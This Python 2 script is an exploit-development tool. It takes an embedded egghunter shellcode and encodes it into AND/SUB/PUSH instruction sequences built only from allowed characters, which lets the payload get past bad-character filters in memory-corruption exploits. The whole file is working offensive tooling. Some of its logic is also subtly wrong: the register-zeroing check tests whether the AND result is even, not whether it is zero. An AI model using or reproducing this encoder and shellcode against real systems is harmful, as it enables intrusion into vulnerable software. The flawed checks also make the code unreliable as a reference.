#!/usr/bin/python
shellcode = [
    "66", "81", "CA", "FF", "0F", "42", "52", "6A", "02", "58", "CD", "2E", "3C",
    "05", "5A", "74", "EF", "B8", "74", "68", "6F", "72", "8B", "FA", "AF", "75",
    "EA", "AF", "75", "E7", "FF", "E7"]

allowedCharacters = [
    "01", "02", "03", "04", "05", "06", "07", "08", "09", "0b", "0c", "0e", "0f",
    "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "1a", "1b", "1c",
    "1d", "1e", "1f", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29",
    "2a", "2b", "2c", "2d", "2e", "30", "31", "32", "33", "34", "35", "36", "37",
    "38", "39", "3b", "3c", "3d", "3e", "41", "42", "43", "44", "45", "46", "47",
    "48", "49", "4a", "4b", "4c", "4d", "4e", "4f", "50", "51", "52", "53", "54",
    "55", "56", "57", "58", "59", "5a", "5b", "5c", "5d", "5e", "5f", "60", "61",
    "62", "63", "64", "65", "66", "67", "68", "69", "6a", "6b", "6c", "6d", "6e",
    "6f", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "7a", "7b",
    "7c", "7d", "7e", "7f"]

register = "EAX"
outputFile = "output.txt"

MAX = 4
FOUND = []


def resolveBytes(bytes):
    """
    Take a byte sequence like (0x1800188B):

    '0x17' =  ['14','02', '01'],
    '0x100' = '7f', '7e', '03'],
    '0x18', ['15', '02', '01'],
    '0x8b', ['7f', '0b', '01']

    And convert it to a useable substraction sequence:

    sub reg, 147f157f
    sub reg, 027e020b
    sub reg, 01030101   -
    ---------------------
    sub reg, 1800180b

    :param bytes:
    :return:
    """
    resolved = []
    row = 0
    cell = 0
    for byte in bytes:
        for b in byte[1]:

            if len(resolved) -1 < cell:
                resolved.append([])

            resolved[cell].append(b)
            cell += 1

        cell = 0
        row += 1

    return resolved


def binAND(a, b):
    """
    Perfom a binary AND operation on two hexedecimal values and return the result as a boolean

    :param a: First hexedecimal value to perfom AND operation on
    :param b: Second hexedecimal value to perfom AND operation on
    :return: Boolean
    """
    a = int(a, 16)
    b = int(b, 16)
    result = hex(a & b)

    if int(result, 16) % 2 is 0:
        return True


def findZeroAND(allowedCharacters):
    """
    Use the list of allowed characters to find a suitable option to clear any CPU-registers

    :param allowedCharacters: The list of allowed characters to search in
    :return: Set|None Returns a set of useable characters for the AND operation, None if not found
    """
    for a in allowedCharacters:
        for b in allowedCharacters:
            if binAND(a, b):
                return (a, b)
    return None


def formatHex(decimal):
    """
    Takes a byte (eg: 12321312) and encode it with proper padding for representation (0x01800808B).

    :param decimal: The Decimal representation of the byte segments.
    :return: The hex representation of a byte
    """
    output = format(decimal, "0X")
    if len(output) < 8:
        padding = "0" * (8 - len(output))
        output = padding + output

    return output


def findSubtractions():
    """
    In case the bytes we wish to place in memory contain bad characters (E7FFE775, the first bytes of shellcode)
    we can overflow a register such as EAX to hold our have a base value which we can subtract from using the available
    bytes until we reach our intended value.

    Example:
        <subtract from EAX> = <EAX at 0x00000> - <desired bytes>
        0x1800188B = 0xFFFFFFFF - 0xE7FFE775 + 1 (overflow 0xFFFFFFFF because 0x00 is not allowed directly)

    :return:
    """
    subtractions = []
    base = int("FFFFFFFF", 16)
    for s in reversed(range(0, len(shellcode), 4)):
        s = shellcode[s:s + 4]
        s = s[::-1]
        s = "".join(s)
        s = int(s, 16)

        goal = (base - s) + 1
        subtractions.append(goal)

    return subtractions


def convertBytes(byte):
    """
    Convert HEX representation of Bytes to their corresponding decimal values and remove NULL-bytes by
    overflowing into the next byte.

    :param byte: The Hex byte to change to an Integer
    :return: Inverted list of Integer values
    """
    segments = []
    intSegments = []

    # Modify segment to integer values
    for s in byte:
        s = int(s, 16)
        segments.append(s)

    # Take out zero's by overflowing the integer value
    # Example:
    #
    #   0x18 = 24 - 1 = 23
    #   0x00 = 256 (overvlow)
    carry = 0
    for s in segments[::-1]:
        s = s - carry
        carry = 0

        if s is 0:
            s = 256
            carry = 1
        intSegments.append(s)

    return intSegments[::-1]


def getValidSolution(encodedBytes):
    """
    Takes all encoded options for the list of bytes, finds and reports the SHORTEST possible combination.

    Example:
        ('0x8b', [['7f', '0c], ['7f', '0b', '01']])

        becomes:
        ('0x8b', ['7f', '0c]


    :param encodedBytes: The encoded bytes, ordered by original byte
    :return: The list of minimum matching bytes
    """
    # Find common length
    lengths = []
    for enc in encodedBytes:
        for e in enc[1]:
            lengths.append(len(e))

    sharedLengths = []
    for l in lengths:
        if lengths.count(l) is len(encodedBytes) and l not in sharedLengths:
            sharedLengths.append(l)

    if not len(sharedLengths):
        return None

    # Return proper values
    valid = []
    for enc in encodedBytes:
        for e in enc[1]:
            if len(e) is sharedLengths[0]:
                valid.append((enc[0], e))

    return valid[::-1]


def altSub(target, level, currPosition, found=[]):
    """
    Find sequences of bytes up till length of level that once combined make up for the SUM of the target.

    :param target: The byte to be replaced by summed values
    :param level: The current length of the set
    :param currPosition: Position on the list of availableCharacters (backtracking)
    :param found: List of characters found for this level
    :return: Bool True when match, False when not solution was found
    """
    global availableChars

    valid = 0
    startPosition = 1

    # Correct set size found
    if level is 0:
        #  Backtrack and find a smaller subset
        if target is not 0:
            return 0

        # Target reached, break out of recursion
        global FOUND
        FOUND = found
        return 1

    # Find valid combinations
    charsLeft = (len(availableChars) - currPosition - startPosition)
    while not valid and charsLeft >= 0:
        charsLeft = (len(availableChars) - currPosition - startPosition)
        biggest = availableChars[charsLeft]
        newTarget = target - int(biggest, 16)
        newLevel = level - 1

        found.append(biggest)

        valid = altSub(newTarget, newLevel, currPosition + startPosition, found)
        if not valid:
            del found[-1]
        startPosition = startPosition + 1

    if not valid:
        return 0

    return 1


def encodeSegment(value):
    """
    Takes a segment of 4 bytes (eg: 0x18008B) and tries to find an alternative sequence of values that
    match the original value

    :param value: The byte sequence to encode (size of 4)
    :return:
    """
    target = []

    # Split value in bytes as INT
    for v in range(0, len(value), 2):
        segment = value[v:v + 2]
        target.append(segment)
    target = convertBytes(target)

    results = []

    # TODO: Optimization; Do not calculate already known bytes
    for t in target[::-1]:
        # Search for encoding options
        global availableChars
        availableChars = [a for a in allowedCharacters if int(a, 16)]

        solutions = []
        for level in range(2, MAX + 1):
            global FOUND
            FOUND = []

            valid = altSub(t, level, 0, [])
            if valid:
                solutions.append(FOUND)
        results.append((hex(t), solutions))

    return results


def main():
    print "[#] Size of shellcode {0} bytes".format(len(shellcode))
    if len(shellcode) % 4 is not 0:
        print "[!] Padding shellcode with NOP instructions..."
        padding = (4 - len(shellcode) % 4)
        shellcode.insert(0, "90" * padding)

    print "[#] Allowed characters: {0}".format(len(allowedCharacters))
    clearReg = findZeroAND(allowedCharacters)
    print "[#] Searching for bytes to clear {0}: {1}".format(register, clearReg)

    print "[#] Calculating required subtractions..."
    subtractions = findSubtractions()
    print "[#] Performing encoding for {0} sets of bytes...".format(len(subtractions))

    final = []
    for sub in subtractions:
        print "[+] Encoding: 0x{0}".format(formatHex(sub))
        encodedBytes = encodeSegment(formatHex(sub))
        encodedBytes = getValidSolution(encodedBytes)

        if encodedBytes is None:
            print "[!] A solution is not possible for: {0}".format(hex(sub))
            continue
        else:
            for enc in encodedBytes:
                print "\t{0}\t=\t{1}".format(enc[0], " + ".join(enc[1]))

        final.append(encodedBytes)

    print "[#] Creating ASM instructions..."
    # Resolve bytes
    fh = open(outputFile, "w")
    for bytes in final:
        resolved = resolveBytes(bytes)

        # Zero out EAX
        for i in range(0, 2):
            ascii = clearReg[i] * 4
            bin = ascii[::-1]
            fh.write("25" + bin)

            print "25 {0}\t\tAND {1}, {2}\t ; Zero out EAX".format(bin, register, ascii)

        # Carve out bytes
        for b in resolved:
            ascii = "".join(b[::-1]).upper()
            bin = "".join(b[::-1]).upper()
            fh.write("2D" + bin)

            print "2D {0}\t\tSUB {1}, {2}\t ; Carving out byte".format(bin, register, ascii)

        # Push to stack
        fh.write("50")
        print "50\t\t\tPUSH {0}\t\t ; Save to stack".format(register)

        print ""
    fh.close()
    print "[#] Encoding complete! (See {0})...".format(outputFile)

if __name__ == "__main__":
    main()
